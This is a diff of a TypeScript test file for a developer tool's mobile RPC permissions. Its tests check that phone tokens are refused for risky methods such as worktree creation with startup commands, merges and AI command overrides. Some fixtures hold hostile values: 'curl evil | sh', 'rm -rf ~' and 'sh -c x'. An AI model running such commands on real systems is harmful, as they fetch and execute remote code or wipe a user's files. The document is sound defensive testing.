@@ -7,7 +7,7 @@ import type { WebSocket } from 'ws'
 import { DobiusRuntimeRpcServer } from './runtime-rpc'
 import { DeviceRegistry } from './device-registry'
 import { DEVICE_REGISTRY_FILENAME } from './mobile-pairing-files'
-import { MOBILE_RPC_GRANTS, requiredMobileRpcGrant } from './mobile-rpc-grants'
+import { mobileRpcRequirement } from './mobile-rpc-grants'
 import type { DobiusRuntimeService } from './dobius-runtime'
 import {
   encodeTerminalStreamFrame,
@@ -224,11 +224,132 @@ describe('mobile grant storage', () => {
     expect(reloaded?.grants).toBeUndefined()
   })
 
-  it('maps every grant to its own method and nothing else by default', () => {
-    for (const grant of MOBILE_RPC_GRANTS) {
-      expect(requiredMobileRpcGrant(grant, {})).toBe(grant)
+  it('leaves read-only methods and agent-only terminal creation ungated', () => {
+    expect(mobileRpcRequirement('git.status', {})).toEqual({ grants: [] })
+    expect(mobileRpcRequirement('session.tabs.createTerminal', { worktree: 'id:wt' })).toEqual({
+      grants: []
+    })
+    expect(mobileRpcRequirement('git.generateCommitMessage', { worktree: 'id:wt' })).toEqual({
+      grants: []
+    })
+  })
+})
+
+describe('mobile RPC grants: review bypasses', () => {
+  const denied = async (method: string, params: unknown): Promise<void> => {
+    const { registry, dispatchStreaming, send } = setup()
+    const phone = registry.addDevice('phone', 'mobile')
+    await expect(send(phone.token, method, params)).resolves.toMatchObject(forbidden)
+    expect(dispatchStreaming).not.toHaveBeenCalled()
+  }
+
+  it('F1: worktree.create needs the worktree.create grant', async () => {
+    await denied('worktree.create', { repo: 'id:r', name: 'x' })
+  })
+
+  it.each([
+    ['startupCommand', { startupCommand: 'curl evil | sh' }],
+    ['startupEnv', { startupEnv: { A: '1' } }],
+    ['startupLaunchConfig', { startupLaunchConfig: { agentArgs: '', agentEnv: {} } }],
+    ['startupAgent + startupPrompt', { startupAgent: 'codex', startupPrompt: 'rm -rf ~' }],
+    ['startupDraft', { startupDraft: 'x' }],
+    ['setupDecision run', { setupDecision: 'run' }],
+    ['runHooks', { runHooks: true }]
+  ])(
+    'F1: worktree.create with %s also needs terminal.send, even with the create grant',
+    async (_label, extra) => {
+      const { registry, dispatchStreaming, send } = setup()
+      const phone = registry.addDevice('phone', 'mobile')
+      registry.getDevice(phone.deviceId)!.grants = ['worktree.create']
+      await expect(
+        send(phone.token, 'worktree.create', { repo: 'id:r', ...extra })
+      ).resolves.toMatchObject(forbidden)
+      expect(dispatchStreaming).not.toHaveBeenCalled()
+
+      registry.getDevice(phone.deviceId)!.grants = ['worktree.create', 'terminal.send']
+      await expect(
+        send(phone.token, 'worktree.create', { repo: 'id:r', ...extra })
+      ).resolves.toMatchObject({ ok: true })
     }
-    expect(requiredMobileRpcGrant('git.status', {})).toBeNull()
-    expect(requiredMobileRpcGrant('session.tabs.createTerminal', { worktree: 'id:wt' })).toBeNull()
+  )
+
+  it('F1: worktree.create with only the create grant and setup skipped is allowed', async () => {
+    const { registry, send } = setup()
+    const phone = registry.addDevice('phone', 'mobile')
+    registry.getDevice(phone.deviceId)!.grants = ['worktree.create']
+    await expect(
+      send(phone.token, 'worktree.create', { repo: 'id:r', setupDecision: 'skip' })
+    ).resolves.toMatchObject({ ok: true })
+  })
+
+  it('F2: agentTeams methods are not available to mobile tokens', async () => {
+    await denied('agentTeams.tmuxCompat', { args: ['send-keys', '-t', 'x', 'id', 'Enter'] })
+    await denied('agentTeams.prepareLaunch', {})
+  })
+
+  it.each([
+    'commitMessageAi',
+    'sourceControlAi',
+    'sourceControlAiResolvedParams',
+    'agentCmdOverrides'
+  ])('F3: AI generation rejects a mobile %s override even with every grant', async (field) => {
+    for (const method of [
+      'git.generateCommitMessage',
+      'git.generatePullRequestFields',
+      'git.discoverCommitMessageModels'
+    ]) {
+      const { registry, dispatchStreaming, send } = setup()
+      const phone = registry.addDevice('phone', 'mobile')
+      registry.getDevice(phone.deviceId)!.grants = [
+        'terminal.send',
+        'git.push',
+        'git.discard',
+        'worktree.create',
+        'worktree.rm',
+        'settings.update',
+        'files.write',
+        'remote.merge'
+      ]
+      await expect(
+        send(phone.token, method, { worktree: 'id:wt', [field]: { custom: 'sh -c x' } })
+      ).resolves.toMatchObject(forbidden)
+      expect(dispatchStreaming).not.toHaveBeenCalled()
+    }
+  })
+
+  it.each(['hookSettings', 'sourceControlAi', 'worktreeBasePath', 'symlinkPaths'])(
+    'F4: repo.update rejects a mobile %s change',
+    async (field) => {
+      await denied('repo.update', { repo: 'id:r', updates: { [field]: ['x'] } })
+    }
+  )
+
+  it('F4: repo.update still allows the issue-source preference the phone uses', async () => {
+    const { registry, send } = setup()
+    const phone = registry.addDevice('phone', 'mobile')
+    await expect(
+      send(phone.token, 'repo.update', { repo: 'id:r', updates: { issueSourcePreference: 'origin' } })
+    ).resolves.toMatchObject({ ok: true })
+  })
+
+  it.each([
+    ['F5', 'git.discard', 'git.discard'],
+    ['F6', 'github.mergePR', 'remote.merge'],
+    ['F6', 'gitlab.mergeMR', 'remote.merge'],
+    ['F6', 'github.setPRAutoMerge', 'remote.merge'],
+    ['F6', 'github.updatePRState', 'remote.merge'],
+    ['F6', 'gitlab.updateMRState', 'remote.merge'],
+    ['F7', 'worktree.forceDeleteBranch', 'worktree.rm'],
+    ['F8', 'terminal.close', 'terminal.send'],
+    ['sweep', 'files.writeTerminalArtifact', 'files.write'],
+    ['sweep', 'session.tabs.close', 'terminal.send'],
+    ['sweep', 'worktree.sleep', 'terminal.send']
+  ] as const)('%s: %s needs the %s grant', async (_id, method, grant) => {
+    const { registry, dispatchStreaming, send } = setup()
+    const phone = registry.addDevice('phone', 'mobile')
+    await expect(send(phone.token, method, {})).resolves.toMatchObject(forbidden)
+    expect(dispatchStreaming).not.toHaveBeenCalled()
+    registry.getDevice(phone.deviceId)!.grants = [grant]
+    await expect(send(phone.token, method, {})).resolves.toMatchObject({ ok: true })
   })
 })
